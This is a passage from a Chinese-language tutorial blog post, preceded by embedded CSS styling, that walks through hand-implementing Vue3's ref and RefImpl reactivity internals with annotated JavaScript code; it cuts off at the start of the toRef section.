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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAdCAYAAABcz8ldAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAhgSURBVGhD7Zp7bBTHHcdn33t7vvOdzy+ITVKDU0xIKG2ABCPTRCCaUiEVKWoqRJuASAhCitRCVKSoalFUKZBiSmmFRRJKRUnUtIpo+aNqGgwoOCmuFUIRzxjwE4zte+97drYzztji8HPvtkit/PnH+n1397Tz+83vN/PbMZhmmmmm+d+BoX8n5diihcGqgFQf5vk6BMAskWUlw3GyFnIvtqWSf91w7mKC3npfOLX7wYeiIa6BBWCOLLFRF2NB0JvIOP/80YG+k2ev6S699b/OzOfKBW5l5KsgyC4DCFQDnpEAdE1goc/dlNPc/Up7P711UiYNSMuyxeUzZPnHgGHWh5XADEkSAcdiN+AnEXIBhBComgFU0/xQR+jnj51sOUMf9Z0NKyL8S9+JPBEN8zuCMrsqGOA5QWAAyzLAxe53HBeYFgJp1c5Cx33nyIfpV3e+22/Sx32nev/sMCgVnmM4bjOniAtZWQAsz315EfsGQQc4hgWcjHkCmOj1rheuNn95cXwmDMiVp5etC/D8m5FwUWVQUYYGPh6mZYFUOgsGVa1pXvOZzVT2jRuH54RM230jEuI3RcIiL4l4UkxAJmuD/riVsqD7ct2m9nep7BtVTbVfZ0uE/UIk+CQflAHDjf8+Lg6MldYATGpH3c/Ul7p3dWXppVGM6eElJSHmnQWPbSlRlN1lJcUBjqNRnwJZVQO3B5P/uq5rK1d90pakckFcaKp5UJHY92JR8YlwkUDVySEZfGfQdO7E7Z8s2HL9TSoXTPXRud9nA8IBqSwcZgWeqpPj6BYw7yTbXBN9q2v9lQEq5zBmWA8vWLCptCi4tzwW8RQMQlFQATPLSh6vCSh/plJBkMyQBHZfWYnkKRgEktEVpTJXERN2Xzo4ex2VC6K6qXYpF5b3ypVRT8EgcAERSJXRbwCBOTFzXblM5RxGBaRt+ZPYA+LO0mgxz5K1Ig+UgAzKIuGnz39z6S+olDeaibaXRsU1RUFvgx+GwTWgPCaDgMw2XXpr9gwq50XV0bkxJiYeEiNF5cwE5XsiOEkAUkXkUW51SSOVchjl8WKef604XFSRbzCGCYeCoESStv/p8QU1VPIM3knNDynctnBRfsEYhgSlNCIGgQv2UCkvGIHZgteMh1nBW9W4F16RAM6yDVV7amZTaYQcr59cuuhhWRTWBvAMLxQGeyFSHOLnh0MvUskz5RF+fbRYDEy0mZgqQYUHOLhr//b6rGoqeaLqQG0pw3PrBbyA+4EQUkRmhvgqNUfICUipKK4OKUqIJVPKB0jpEhjmWWp64jdbKmVZZNYogcJm493gsifOqhDyeh9GYR/FM7sW+DA5CKR0MSK3tvKZkpwB5gRE4tjFEr7RL0iWBGV51vHFCyupNGWWPqLgnoer9mtyEGSJAzwLllDTGzyznDjRN/CwOFkoFb4bm0eVIXICgpvdGoEvrF7fC89zfLkkeV5HbOhWiTwTpKYvCAJLGshRdXtKMKAWlyxq+MPQLk1h66g5RE5ABJYNFrqY3wvJklJRUKg5ZWLFXIA86yek2uDOPkBNb3CM5Pf7DL2QyIrUGiLH+xC5Bmmm/ARnHUhC6PnzxWDK0RH5HuIjZGy27erU9AZ0dTIWXyG+NpBBrSFySxZw220IqeUPFoS6jVAPNadM7yDsgNB1qOkLuAziMYIb1PQGA75wIaKGPyAb+9oF16g5RE5ALIQ+tSyLWoWDEAK6aXW3JlK9VJoyx1oyvVkNdvo5KXXDAVkdnaKmNwx0xjH98w3JNmTCm+Bc9hKVhsgJSI9pvp9Vdd++jmq6AXB2/HHrhcs5aTkVDv0DFzoHvKdq/mQsKX/4t7KJLDpOJW+IbAvMGoMkxfwAWZB8DT7W1diTE+WcgKz6pK1bs6z3daPwmJDsSKt6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在 Vue3 的响应式系统中，<code>ref</code> 是一个核心 API，它让我们能够创建响应式的数据引用。虽然日常开发中我们频繁使用它，但你是否曾好奇过它的内部实现原理？今天，就让我们一起来揭开 <code>ref</code> 的神秘面纱，手动实现一个属于自己的 <code>ref</code> 函数！</p>
<h2 data-id="heading-1">系列文章</h2>
<p>为了帮助你更好地理解 Vue3 响应式系统的完整实现，推荐阅读本系列的其他文章：</p>
<ol>
<li><a href="https://juejin.cn/post/7573694361474793499" target="_blank" title="https://juejin.cn/post/7573694361474793499">Vue3 响应式原理：从零实现 Reactive</a></li>
<li><a href="https://juejin.cn/post/7574625040630759462" target="_blank" title="https://juejin.cn/post/7574625040630759462">Vue3 响应式原理：手写 Computed 和 Watch 的奥秘</a></li>
</ol>
<blockquote>
<p>💡 提示<br/>
本文中涉及的部分函数可能在其他文章中实现，你可以通过上述目录查找完整实现。如果想深入研究，也可以直接查看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgardenia83%2Fvue-source-code" target="_blank" title="https://github.com/gardenia83/vue-source-code" ref="nofollow noopener noreferrer">Vue3 源码</a>。</p>
</blockquote>
<h2 data-id="heading-2">什么是ref?</h2>
<p>在深入实现之前，让我们先回顾一下 <code>ref</code> 的基本用法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">const</span> name = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'lucy'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name.<span class="hljs-property">value</span>); <span class="hljs-comment">// 'lucy'</span>
name.<span class="hljs-property">value</span> = <span class="hljs-string">'james'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name.<span class="hljs-property">value</span>); <span class="hljs-comment">// 'james'</span>
</code></pre>
<p><code>ref</code> 接收一个内部值，返回一个响应式的、可更改的 ref 对象，该对象只有一个指向其内部值的属性 <code>.value</code>。</p>
<h2 data-id="heading-3">手动实现ref</h2>
<h3 data-id="heading-4">核心架构</h3>
<p>当我们打印 <code>ref</code> 函数创建的对象时，会发现它是一个 <code>RefImpl</code> 类型的实例。这表明在 <code>ref</code> 的底层实现中，有一个专门的类负责实现响应式功能。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 创建响应式引用
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">value</span> - 值
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} <span class="hljs-variable">shallow</span> - 是否为浅层引用
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">RefImpl</span>} ref 实例
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ref</span>(<span class="hljs-params">value, shallow</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createRef</span>(value, shallow);
};
<span class="hljs-comment">/**
 * 创建 ref 的内部函数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">rawValue</span> - 原始值
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} <span class="hljs-variable">shallow</span> - 是否为浅层引用
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">RefImpl</span>} ref 实例
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createRef</span>(<span class="hljs-params">rawValue, shallow</span>) {
  <span class="hljs-comment">// 如果传入的值已经是 ref，则直接返回该 ref，避免重复包装</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRef</span>(rawValue)) {
    <span class="hljs-keyword">return</span> rawValue;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefImpl</span>(rawValue, shallow);
}
<span class="hljs-comment">/**
 * 检查值是否为 ref
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">r</span> - 待检查值
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>} 是否为 ref
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">isRef</span>(<span class="hljs-params">r</span>) {
  <span class="hljs-keyword">return</span> r ? r[<span class="hljs-title class_">ReactiveFlags</span>.<span class="hljs-property">IS_REF</span>] === <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;
}
</code></pre>
<h3 data-id="heading-5">RefImpl类实现</h3>
<p><code>RefImpl</code> 类的实现与我们在<a href="https://juejin.cn/post/7574625040630759462" target="_blank" title="https://juejin.cn/post/7574625040630759462">手写 Computed 实现</a>中看到的模式有些相似：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * Ref 实现类
 * 用于创建基本的响应式引用
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  _value; <span class="hljs-comment">// 存储响应式值</span>
  __rawValue; <span class="hljs-comment">// 存储原始值（用于比较）</span>
  dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(); <span class="hljs-comment">// 依赖收集集合</span>
  [<span class="hljs-title class_">ReactiveFlags</span>.<span class="hljs-property">IS_REF</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标识为 ref 对象</span>
  [<span class="hljs-title class_">ReactiveFlags</span>.<span class="hljs-property">IS_SHALLOW</span>] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 是否为浅层 ref</span>

  <span class="hljs-comment">/**
   * 构造函数
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">value</span> - 初始值
   */</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">__rawValue</span> = value;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-title function_">toReactive</span>(value); <span class="hljs-comment">// 如果是对象则转换为响应式</span>
  }

  <span class="hljs-comment">/**
   * 获取 ref 的值
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any</span>} 当前值
   */</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// 如果存在激活的副作用，则收集依赖</span>
    <span class="hljs-keyword">if</span> (activeEffect) {
      <span class="hljs-title function_">trackEffects</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;
  }

  <span class="hljs-comment">/**
   * 设置 ref 的值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">newValue</span> - 新值
   */</span>
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newValue</span>) {
    <span class="hljs-comment">// 只有当新值不等于旧值时才更新</span>
    <span class="hljs-keyword">if</span> (newValue !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">__rawValue</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-title function_">toReactive</span>(newValue);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">__rawValue</span> = newValue;
      <span class="hljs-title function_">triggerEffects</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>); <span class="hljs-comment">// 触发依赖更新</span>
    }
  }
}
</code></pre>
<p>在上述代码中，<code>toReactive</code> 函数负责判断值类型：如果是对象，就通过 <code>reactive</code> 函数转换为响应式对象。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// reactive.js</span>
<span class="hljs-comment">/**
 * 将值转换为响应式对象（如果是对象的话）
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">value</span> - 需要转换的值
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Proxy|any</span>} 响应式对象或原始值
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">toReactive</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-comment">// 如果是对象则创建响应式代理，否则返回原始值</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isObject</span>(value) ? <span class="hljs-title function_">reactive</span>(value) : value;
}
</code></pre>
<h2 data-id="heading-6">手动实现toRef函数</h2>
<h3 data-id="heading-7">问题背景</h3>
<p><code>toRef</code> 是开发中常用的一个重要函数，它的主要作用是：<strong>为响应式对象上的单个属性创建一个"响应式引用"(Ref)</strong> 。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>; 

